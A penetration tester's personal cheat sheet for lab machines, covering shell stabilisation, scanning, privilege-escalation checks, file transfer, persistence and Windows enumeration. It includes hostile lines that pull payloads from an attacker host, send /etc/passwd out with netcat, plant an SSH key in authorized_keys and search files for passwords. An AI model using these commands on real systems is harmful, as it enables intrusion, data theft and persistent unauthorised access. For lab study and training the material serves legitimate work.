# Reminders - Quick Commands I Always Forget

## Spawn TTY Shell
```bash
# Python (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Then upgrade to full TTY:
# 1. Ctrl+Z (background it)
# 2. stty raw -echo; fg
# 3. export TERM=xterm
```

## Basic Enumeration I Forget

### Sudo Enumeration
```bash
# Check sudo version (for exploits)
sudo -V | head -n1

# List sudo privileges
sudo -l
sudo -ll  # More detailed

# Run as different user
sudo -u username command
```

### Scanning
```bash
# UDP scan (I always forget to check UDP!)
sudo nmap -sU --top-ports 100 -vv 10.10.10.1

# Quick TCP all ports
nmap -p- --min-rate 1000 10.10.10.1 -v

# Then detailed on found ports
nmap -p 22,80,443 -sCV 10.10.10.1 -oN detailed.nmap
```

### Find SUID Files
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find capabilities
getcap -r / 2>/dev/null
```

### Network Info
```bash
# Show listening ports (when ss/netstat not available)
cat /proc/net/tcp | grep " 0A " # Listening state
cat /proc/net/tcp # All TCP connections

# Active connections
ss -tupln
netstat -tulpn
```

## File Transfer Methods

### Python HTTP Server
```bash
# Python3
python3 -m http.server 8080

# Python2
python -m SimpleHTTPServer 8080

# Download on target
wget http://10.10.14.5:8080/file
curl -O http://10.10.14.5:8080/file
```

### Base64 Transfer (for small files)
```bash
# On attacker
base64 -w0 file.sh > file.b64

# On target
echo "BASE64_STRING_HERE" | base64 -d > file.sh
```

### Netcat Transfer
```bash
# Receiver (your machine)
nc -lvnp 9001 > received_file

# Sender (target)
nc 10.10.14.5 9001 < /etc/passwd
```

## Persistence & Cron

### Check Cron Jobs
```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*

# User crontabs
crontab -l
sudo crontab -l

# Look for cron logs
grep CRON /var/log/syslog
grep CRON /var/log/cron.log
```

### Add SSH Key
```bash
# Generate on your machine if needed
ssh-keygen -t rsa -b 4096

# Add to target
echo "ssh-rsa YOUR_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

## Database Connections

### MySQL
```bash
# Connect
mysql -u root -p
mysql -u username -ppassword  # No space after -p

# Common commands I forget
show databases;
use database_name;
show tables;
describe table_name;
select * from table_name;
```

### PostgreSQL
```bash
# Connect
psql -U username -h localhost

# Commands
\l          # List databases
\c dbname   # Connect to database
\dt         # List tables
\d table    # Describe table
\q          # Quit
```

## Windows Quick Commands

### File Transfer
```bash
# Certutil
certutil -urlcache -f http://10.10.14.5:8080/file.exe file.exe

# PowerShell
iwr -Uri http://10.10.14.5:8080/file.exe -OutFile file.exe
Invoke-WebRequest -Uri http://10.10.14.5:8080/file.exe -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8080/file.exe','file.exe')
```

### Windows Enumeration
```bash
# Current user info
whoami /all
whoami /priv

# System info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Network info
netstat -ano
ipconfig /all

# Find passwords in files
findstr /si password *.txt *.xml *.ini
```

## Useful Links

- **Reverse Shells**: https://revshells.com
- **GTFOBins** (SUID/sudo exploits): https://gtfobins.github.io
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **LOLBAS** (Windows): https://lolbas-project.github.io
- **CyberChef**: https://gchq.github.io/CyberChef
- **CrackStation** (hash cracking): https://crackstation.net
- **Explain Shell**: https://explainshell.com

## Common Ports to Remember

```
21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
110   - POP3
139   - NetBIOS
143   - IMAP
443   - HTTPS
445   - SMB
1433  - MSSQL
3306  - MySQL
3389  - RDP
5432  - PostgreSQL
5985  - WinRM HTTP
5986  - WinRM HTTPS
6379  - Redis
8080  - HTTP Alt
```

## Stabilize Shell Checklist

1. Check if python/python3 available: `which python python3`
2. Spawn TTY: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. Background: `Ctrl+Z`
4. Fix terminal: `stty raw -echo; fg`
5. Set term: `export TERM=xterm`
6. Fix size: `stty rows 50 columns 200`

## Quick Wins to Check

- [ ] `sudo -l` - Can I run anything as root?
- [ ] `find / -perm -4000 2>/dev/null` - SUID binaries?
- [ ] `getcap -r / 2>/dev/null` - Capabilities?
- [ ] `cat /etc/crontab` - Cron jobs running?
- [ ] `ls -la /opt /tmp /var/tmp` - Anything interesting?
- [ ] `history` - Command history?
- [ ] `cat ~/.bash_history` - Bash history?
- [ ] `env` - Environment variables with passwords?
- [ ] `ss -tulpn` or `netstat -tulpn` - Local services?
- [ ] Check UDP ports if TCP scan found nothing!